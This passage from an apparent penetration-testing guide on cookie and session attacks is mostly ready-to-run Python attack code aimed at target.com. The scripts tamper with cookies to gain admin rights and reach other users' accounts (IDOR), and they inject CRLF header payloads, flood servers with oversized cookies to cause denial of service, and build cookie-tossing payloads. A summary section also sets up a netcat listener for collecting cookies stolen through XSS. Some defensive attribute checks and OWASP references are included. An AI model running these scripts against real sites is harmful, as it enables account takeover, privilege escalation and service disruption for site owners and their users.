        elif encoding == 'url+base64':
            from urllib.parse import quote
            return quote(base64.b64encode(data.encode()).decode())

        return data

    def test_privilege_escalation(self, cookie_name, cookie_value):
        """Test for privilege escalation via cookie manipulation"""
        decodings = self.decode_cookie(cookie_value)

        for encoding_name, decoded in decodings:
            if isinstance(decoded, dict):
                # Try modifying role/admin fields
                modifications = [
                    ('role', 'admin'),
                    ('role', 'administrator'),
                    ('isAdmin', True),
                    ('is_admin', True),
                    ('admin', True),
                    ('user_type', 'admin'),
                    ('access_level', 999),
                    ('permissions', ['admin', 'write', 'delete']),
                ]

                for field, value in modifications:
                    modified = decoded.copy()
                    modified[field] = value

                    # Re-encode
                    if 'base64' in encoding_name:
                        new_cookie = self.encode_cookie(modified, 'base64')
                    else:
                        new_cookie = self.encode_cookie(modified)

                    # Test
                    response = requests.get(
                        f"{self.target_url}/admin",
                        cookies={cookie_name: new_cookie}
                    )

                    if response.status_code == 200 and 'denied' not in response.text.lower():
                        print(f"[+] Privilege escalation with {field}={value}")
                        print(f"    Modified cookie: {new_cookie}")
                        return new_cookie

        return None

    def test_user_id_manipulation(self, cookie_name, cookie_value):
        """Test for IDOR via cookie manipulation"""
        decodings = self.decode_cookie(cookie_value)

        for encoding_name, decoded in decodings:
            if isinstance(decoded, dict):
                id_fields = ['user_id', 'userId', 'id', 'uid', 'account_id']

                for field in id_fields:
                    if field in decoded:
                        original_id = decoded[field]

                        # Try different IDs
                        for test_id in [1, 2, 0, -1, 999, original_id + 1, original_id - 1]:
                            if test_id == original_id:
                                continue

                            modified = decoded.copy()
                            modified[field] = test_id

                            new_cookie = self.encode_cookie(modified)

                            response = requests.get(
                                f"{self.target_url}/profile",
                                cookies={cookie_name: new_cookie}
                            )

                            if response.status_code == 200:
                                print(f"[+] Potential IDOR: {field}={test_id}")

# Usage
manipulator = CookieManipulator("https://target.com")
manipulator.test_privilege_escalation("session", "base64_encoded_cookie_here")
```

### 4.2 Cookie Injection

Injecting malicious cookies to affect application behavior.

#### Cookie Injection Techniques
```python
import requests

class CookieInjector:
    def __init__(self, target_url):
        self.target_url = target_url

    def test_header_injection(self):
        """Test for cookie injection via headers"""
        # CRLF injection in cookie
        payloads = [
            "normal; injected=value",
            "normal\r\nSet-Cookie: injected=value",
            "normal%0d%0aSet-Cookie:%20injected=value",
            "normal\r\ninjected: header",
        ]

        for payload in payloads:
            try:
                response = requests.get(
                    self.target_url,
                    cookies={'test': payload}
                )

                # Check if injection affected response
                if 'injected' in response.headers.get('Set-Cookie', ''):
                    print(f"[+] Cookie injection successful: {payload}")

            except:
                pass

    def test_cookie_bomb(self, num_cookies=100, cookie_size=4000):
        """Test application handling of large cookies (DoS)"""
        cookies = {}

        for i in range(num_cookies):
            cookies[f'bomb_{i}'] = 'x' * cookie_size

        try:
            response = requests.get(
                self.target_url,
                cookies=cookies,
                timeout=30
            )
            print(f"[*] Response with cookie bomb: {response.status_code}")

            if response.status_code >= 500:
                print("[+] Server error with large cookies - potential DoS")

        except requests.exceptions.RequestException as e:
            print(f"[+] Request failed with cookie bomb: {e}")

    def test_special_characters(self):
        """Test handling of special characters in cookies"""
        special_chars = [
            ('null_byte', 'value\x00test'),
            ('newline', 'value\ntest'),
            ('carriage_return', 'value\rtest'),
            ('tab', 'value\ttest'),
            ('semicolon', 'value;extra'),
            ('equals', 'value=extra'),
            ('unicode', 'value\u0000test'),
            ('backslash', 'value\\test'),
            ('quote', 'value"test'),
            ('single_quote', "value'test"),
        ]

        for name, value in special_chars:
            try:
                response = requests.get(
                    self.target_url,
                    cookies={'test': value}
                )
                print(f"[*] {name}: Status {response.status_code}")

            except Exception as e:
                print(f"[!] {name}: Error - {e}")

# Usage
injector = CookieInjector("https://target.com")
injector.test_header_injection()
injector.test_special_characters()
```

### 4.3 Cookie Overflow Attacks

Exploiting cookie size limits to manipulate application behavior.

#### Cookie Overflow Script
```python
import requests

class CookieOverflow:
    def __init__(self, target_url):
        self.target_url = target_url

    def test_cookie_truncation(self, cookie_name, important_suffix):
        """Test if oversized cookies are truncated"""
        # Most servers have ~4KB cookie limit
        max_size = 4096

        # Create cookie that will be truncated
        padding_size = max_size - len(important_suffix) - len(cookie_name) - 10
        cookie_value = 'A' * padding_size + important_suffix

        response = requests.get(
            self.target_url,
            cookies={cookie_name: cookie_value}
        )

        print(f"[*] Sent cookie of {len(cookie_value)} bytes")
        print(f"[*] Response status: {response.status_code}")

    def test_cookie_jar_overflow(self):
        """Test cookie jar limits to evict legitimate cookies"""
        # Browsers typically limit to 50-180 cookies per domain
        session = requests.Session()

        # First, get legitimate session
        session.get(self.target_url)

        legitimate_cookie = None
        for cookie in session.cookies:
            if 'session' in cookie.name.lower():
                legitimate_cookie = cookie.name
                break

        print(f"[*] Legitimate cookie: {legitimate_cookie}")

        # Flood with cookies
        for i in range(200):
            session.cookies.set(f'flood_{i}', 'x' * 100)

        # Check if legitimate cookie was evicted
        if legitimate_cookie and legitimate_cookie not in session.cookies:
            print("[+] Legitimate cookie evicted from jar!")
        else:
            print("[-] Legitimate cookie still present")

    def test_domain_cookie_limit(self):
        """Test total cookie size limit per domain"""
        session = requests.Session()

        # Some servers reject requests with too many cookies
        total_cookies = {}
        for i in range(100):
            total_cookies[f'cookie_{i}'] = 'x' * 100

        try:
            response = requests.get(
                self.target_url,
                cookies=total_cookies,
                timeout=30
            )

            if response.status_code == 400:
                print("[+] Server rejects oversized cookie headers")
            elif response.status_code == 431:
                print("[+] 431 Request Header Fields Too Large")
            else:
                print(f"[*] Response: {response.status_code}")

        except Exception as e:
            print(f"[!] Error: {e}")

# Usage
overflow = CookieOverflow("https://target.com")
overflow.test_cookie_truncation("session", ";admin=true")
overflow.test_cookie_jar_overflow()
```

### 4.4 Subdomain Cookie Leakage

Cookies accessible across subdomains.

#### Subdomain Cookie Analysis
```python
import requests
from urllib.parse import urlparse

class SubdomainCookieAnalyzer:
    def __init__(self, main_domain):
        self.main_domain = main_domain

    def analyze_cookie_scope(self, cookie):
        """Analyze cookie domain scope"""
        domain = cookie.domain

        issues = []

        if domain.startswith('.'):
            issues.append(f"Cookie accessible to all subdomains of {domain}")

        if not cookie.secure:
            issues.append("Cookie not marked Secure - sent over HTTP")

        if not cookie.has_nonstandard_attr('HttpOnly'):
            issues.append("Cookie not HttpOnly - accessible via JavaScript")

        if cookie.has_nonstandard_attr('SameSite'):
            samesite = cookie.get_nonstandard_attr('SameSite')
            if samesite.lower() == 'none':
                issues.append("SameSite=None - cookie sent with cross-site requests")
        else:
            issues.append("No SameSite attribute - varies by browser")

        return issues

    def test_subdomain_access(self, subdomains, cookie_name, cookie_value):
        """Test if main domain cookie is accessible from subdomains"""
        results = {}

        for subdomain in subdomains:
            try:
                response = requests.get(
                    f"https://{subdomain}",
                    cookies={cookie_name: cookie_value},
                    timeout=10
                )

                # Check if cookie was sent
                request_cookies = response.request.headers.get('Cookie', '')
                if cookie_name in request_cookies:
                    results[subdomain] = 'Cookie sent'
                else:
                    results[subdomain] = 'Cookie not sent'

            except Exception as e:
                results[subdomain] = f'Error: {e}'

        return results

    def find_subdomain_cookie_theft_vector(self, subdomains):
        """Find subdomains that could steal main domain cookies"""
        vulnerable = []

        for subdomain in subdomains:
            try:
                response = requests.get(
                    f"https://{subdomain}",
                    timeout=10
                )

                # Check for XSS indicators
                if 'Content-Security-Policy' not in response.headers:
                    vulnerable.append({
                        'subdomain': subdomain,
                        'issue': 'No CSP - potential XSS for cookie theft'
                    })

                # Check if subdomain can set cookies for parent
                for cookie in response.cookies:
                    if cookie.domain.startswith('.'):
                        vulnerable.append({
                            'subdomain': subdomain,
                            'issue': f'Can set cookies for {cookie.domain}'
                        })

            except:
                pass

        return vulnerable

# Usage
analyzer = SubdomainCookieAnalyzer("target.com")
subdomains = ['www.target.com', 'api.target.com', 'dev.target.com', 'test.target.com']
vulnerabilities = analyzer.find_subdomain_cookie_theft_vector(subdomains)
```

### 4.5 Cookie Tossing

Overwriting cookies using subdomain control.

#### Cookie Tossing Attack
```python
import requests

class CookieTossing:
    """
    Cookie Tossing: Overwrite main domain cookies from controlled subdomain

    If attacker controls evil.target.com, they can set cookies for .target.com
    which may overwrite or shadow legitimate cookies on www.target.com
    """

    def __init__(self, main_domain):
        self.main_domain = main_domain

    def demonstrate_tossing(self):
        """Demonstrate cookie tossing concept"""
        print("""
        Cookie Tossing Attack Flow:
        1. Attacker controls: evil.target.com

        2. Attacker sets cookie from evil.target.com:
           Set-Cookie: session=attacker_value; domain=.target.com; path=/

        3. When victim visits www.target.com:
           - Both cookies are sent:
             Cookie: session=legitimate_value; session=attacker_value
           - Application may use attacker's value (depending on processing order)

        4. This can enable:
           - Session fixation
           - CSRF token bypass
           - Preference/settings manipulation
        """)

    def test_cookie_priority(self, target_url):
        """Test which cookie value the server uses when duplicates exist"""
        session = requests.Session()

        # Set two cookies with same name
        session.cookies.set('session', 'value1', domain='target.com', path='/')
        session.cookies.set('session', 'value2', domain='.target.com', path='/')

        response = session.get(target_url)

        # The order cookies are sent depends on path specificity
        # More specific path wins, then more specific domain

        print(f"[*] Cookie header sent: {response.request.headers.get('Cookie')}")

    def generate_tossing_payload(self, cookie_name, cookie_value):
        """Generate payloads for cookie tossing from subdomain"""
        payloads = {
            'javascript': f'''
                <script>
                document.cookie = "{cookie_name}={cookie_value}; domain=.{self.main_domain}; path=/";
                </script>
            ''',
            'html_meta': f'''
                <meta http-equiv="Set-Cookie" content="{cookie_name}={cookie_value}; domain=.{self.main_domain}; path=/">
            ''',
            'header': f'''
                Set-Cookie: {cookie_name}={cookie_value}; domain=.{self.main_domain}; path=/
            '''
        }

        return payloads

# Cookie security best practices check
def analyze_cookie_security(cookie):
    """Analyze cookie security attributes"""
    report = {
        'name': cookie.name,
        'issues': []
    }

    # Check Secure flag
    if not cookie.secure:
        report['issues'].append({
            'severity': 'HIGH',
            'issue': 'Missing Secure flag',
            'impact': 'Cookie sent over unencrypted HTTP'
        })

    # Check HttpOnly flag
    if not getattr(cookie, 'httponly', False):
        report['issues'].append({
            'severity': 'HIGH',
            'issue': 'Missing HttpOnly flag',
            'impact': 'Cookie accessible via JavaScript (XSS risk)'
        })

    # Check SameSite
    samesite = getattr(cookie, 'samesite', None)
    if not samesite:
        report['issues'].append({
            'severity': 'MEDIUM',
            'issue': 'Missing SameSite attribute',
            'impact': 'Cookie behavior varies by browser, potential CSRF'
        })
    elif samesite.lower() == 'none':
        report['issues'].append({
            'severity': 'MEDIUM',
            'issue': 'SameSite=None',
            'impact': 'Cookie sent with cross-site requests'
        })

    # Check domain scope
    if cookie.domain and cookie.domain.startswith('.'):
        report['issues'].append({
            'severity': 'LOW',
            'issue': f'Wide domain scope: {cookie.domain}',
            'impact': 'Cookie shared with all subdomains'
        })

    # Check path
    if cookie.path == '/' or not cookie.path:
        report['issues'].append({
            'severity': 'INFO',
            'issue': 'Cookie available on all paths',
            'impact': 'Consider restricting path if possible'
        })

    return report
```

---

## 5. Testing Tools and Commands Summary

### Session Testing
```bash
# Burp Suite - Session handling rules
# Configure session handling in Project Options > Sessions

# Cookie security analysis
curl -sI https://target.com | grep -i "set-cookie"

# Check cookie attributes
curl -c cookies.txt -b cookies.txt https://target.com
cat cookies.txt
```

### XSS Cookie Theft
```bash
# Start listener
nc -lvnp 80

# Python HTTP server for cookie collection
python3 -m http.server 80
```

### Session Fixation Testing
```bash
# Check if URL session accepted
curl -v "https://target.com/?PHPSESSID=test123"

# Check session regeneration
curl -c cookies1.txt https://target.com/login -d "user=test&pass=test"
# Compare session before/after login
```

### Burp Extensions
```
- Session Fixation Scanner
- Cookie Jar Monitor
- Auth Matrix
- AuthAnalyzer
```

### Custom Wordlists
```bash
# Session cookie names
PHPSESSID
JSESSIONID
ASP.NET_SessionId
CFID
CFTOKEN
session
sessionid
sid
auth
token
access_token
refresh_token
```

---

## References

- OWASP Session Management Cheat Sheet
- OWASP Testing Guide: Session Management Testing
- CWE-384: Session Fixation
- CWE-539: Use of Persistent Cookies Containing Sensitive Information
- CWE-614: Sensitive Cookie in HTTPS Session Without 'Secure' Attribute
- CWE-1004: Sensitive Cookie Without 'HttpOnly' Flag
- CWE-613: Insufficient Session Expiration
- OWASP Testing Guide: Testing for Cookies Attributes
- RFC 6265: HTTP State Management Mechanism
